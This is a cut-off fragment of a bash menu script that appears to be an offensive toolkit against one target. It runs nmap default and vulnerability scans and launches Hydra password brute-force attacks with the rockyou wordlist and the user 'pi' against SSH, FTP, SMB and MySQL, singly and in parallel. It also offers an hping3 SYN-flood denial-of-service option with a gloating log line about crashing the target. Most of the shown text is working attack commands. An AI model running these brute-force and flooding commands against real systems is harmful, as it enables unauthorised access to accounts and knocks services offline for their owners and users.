...
10) DOS Attack (hping3 SYN flood on port 80) — WARNING: CAN CRASH TARGET
11) Exit
...
EOF
  ...
  case "$OPTION" in
    1)
      log "Running nmap default scripts on common ports"
      sudo nmap -Pn -sV --script default -oA "$OUTDIR/nmap/default" "$TARGET"
      ;;
    2)
      log "Running nmap vuln scripts on common ports"
    ...
    4)
      ...
      hydra -l pi -P /usr/share/wordlists/rockyou.txt -f -o "$OUTDIR/hydra_ssh.txt" -u "$TARGET" ssh
      ;;
    5)
      log "Start Hydra FTP attack in background"
      hydra -l pi -P /usr/share/wordlists/rockyou.txt -f -o "$OUTDIR/hydra_ftp.txt" -u "$TARGET" ftp
      ;;
    6)
      log "Start Hydra SMB attack in background"
      hydra -l pi -P /usr/share/wordlists/rockyou.txt -f -o "$OUTDIR/hydra_smb.txt" -u "$TARGET" smb
      ;;
    7)
      log "Start Hydra MySQL attack in background"
      hydra -l pi -P /usr/share/wordlists/sqlmap.txt -f -o "$OUTDIR/hydra_mysql.txt" -u "$TARGET" mysql 
      ;;
    8)
      log "All Hydra attacks started in background"
      parallel --jobs 4 ::: \
        "hydra -l pi -P /usr/share/wordlists/rockyou.txt -f -o \"$OUTDIR/hydra/ssh.txt\" -u \"$TARGET\" ssh" \
        "hydra -l pi -P /usr/share/wordlists/rockyou.txt -f -o \"$OUTDIR/hydra/ftp.txt\" -u \"$TARGET\" ftp" \
        "hydra -l pi -P /usr/share/wordlists/rockyou.txt -f -o \"$OUTDIR/hydra/smb.txt\" -u \"$TARGET\" smb" \
        "hydra -l pi -P /usr/share/wordlists/rockyou.txt -f -o \"$OUTDIR/hydra/mysql.txt\" -u \"$TARGET\" mysql"
      ;;
    9)
      ...
      ;;
    10)
      log "DOS Attack: THIS CAN CRASH THE ATTACANT HAAHA"
